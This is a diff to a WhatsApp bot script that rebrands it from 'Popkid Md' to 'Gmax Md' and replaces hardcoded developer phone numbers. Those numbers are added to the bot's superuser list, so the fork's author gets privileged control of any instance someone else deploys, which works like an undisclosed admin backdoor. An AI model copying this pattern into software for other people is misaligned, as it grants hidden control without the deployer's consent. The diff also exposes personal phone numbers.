@@ -192,9 +192,9 @@ if (conf.POPKID_XTECH === "yes") {
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
             const dj = '255622053093';
-            const dj2 = '255622053093';
-            const dj3 = "255753853473";
-            const luffy = '255753853473';
+            const dj2 = '255753853473';
+            const dj3 = "255615729430";
+            const luffy = '255615729430';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -202,7 +202,7 @@ if (conf.POPKID_XTECH === "yes") {
             
             var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\tGMAX XMD ONLINE");
+            console.log("\tGMAX MD ONLINE");
             console.log("=========== written message===========");
             if (verifGroupe) {
                 console.log("message provenant du groupe : " + nomGroupe);
@@ -286,7 +286,7 @@ function mybotpic() {
             };
 
 
-// GMAX XMD DID EVERYTHING ,,,DO NOT COPY ...
+// GMAX MD DID EVERYTHING ,,,DO NOT COPY ...
 if (!superUser && origineMessage  === auteurMessage && conf.AUTO_REACT === "yes") {
 const emojis = ['👣', '🏗️', '✈️', '🌽', '🏸', '🛖', '🍁', '🛰️', '🥔', '🎡', '🎸', '🎼', '🔉', '📿', '🪇', '📹', '🎞️', '🪔', '📔', '🏷️', '💰', '📥', '🗳️', '📭', '🖌️', '📏', '', '🪛', '🔨', '⛓️‍💥', '📌', '🗝️', '🔍', '🥁', '🔊', '🥾', '👢', '🩰', '👡', '🙂', '🎊', '🎉', '🎁', '⛑️', '👋']
          const emokis = emojis[Math.floor(Math.random() * (emojis.length))]
@@ -317,7 +317,7 @@ zk.readMessages([ms.key]);
 
     await zk.rejectCall(callId, callerId);
     await zk.sendMessage(callerId, {
-      text: "```❗📵 sᴏʀʀʏ ,ɴᴏ ᴄᴀʟʟs ᴀʀᴇ ᴀʟʟᴏᴡᴇᴅ ,ᴋɪɴᴅʟʏ ᴛᴇxᴛ, ᴛʜᴀɴᴋ ʏᴏᴜ.\n> GMAX-MD © 𝟐𝟎𝟐𝟒 ."
+      text: "```❗📵 sᴏʀʀʏ ,ɴᴏ ᴄᴀʟʟs ᴀʀᴇ ᴀʟʟᴏᴡᴇᴅ ,ᴋɪɴᴅʟʏ ᴛᴇxᴛ, ᴛʜᴀɴᴋ ʏᴏᴜ.\n> GMAX-𝐌𝐃 𝐁𝐎𝐓 © 𝟐𝟎𝟐𝟒 ."
     });
   }
 });*/ 
@@ -877,18 +877,18 @@ zk.ev.on('group-participants.update', async (group) => {
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ Popkid Md is connecting...");
+                console.log("ℹ️ Gmax Md is connecting...");
             }
             else if (connection === 'open') {
-                console.log("✅ Popkid Md Connected to WhatsApp! ☺️");
+                console.log("✅ Gmax Md Connected to WhatsApp! ☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("Popkid Md is Online 🕸\n\n");
+                console.log("Gmax Md is Online 🕸\n\n");
                 //chargement des commandes 
-                console.log("Loading Popkid Commands ...\n");
+                console.log("Loading Gmax Commands ...\n");
                 fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
@@ -919,18 +919,18 @@ zk.ev.on('group-participants.update', async (group) => {
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
 
-                let cmsg =` GMAX XMD CONNECTED...
+                let cmsg =` ɢᴍᴀx xᴍᴅ ʙᴏᴛ ɪs ᴄᴏɴɴᴇᴄᴛᴇᴅ...
 
  ╭────────────────◆
  │  ᴘʀᴇғɪx : [ ${prefixe} ]
  │  ᴍᴏᴅᴇ : ${md}
  │  ᴘʟᴜɢɪɴs : 345
  │  ᴘʟᴀᴛғᴏʀᴍ : ᴄʜʀᴏᴍᴇ(ᴜʙᴜɴᴛᴜ)
- │  ᴅᴇᴠ : GMAX XMD 255
+ │  ᴅᴇᴠ : ɢᴍᴀx xᴍᴅ 🇹🇿
  ╰─────────────────◆
 
 sᴜᴘᴘᴏʀᴛ ʙʏ sᴜʙsᴄʀɪʙɪɴɢ
-youtube.com/@gmaxtv1661`;
+youtube.com/@popkid-254`;
                 await zk.sendMessage(zk.user.id, { text: cmsg });
                 }
             }
@@ -1053,5 +1053,4 @@ youtube.com/@gmaxtv1661`;
     });
     main();
 }, 5000);
-
 
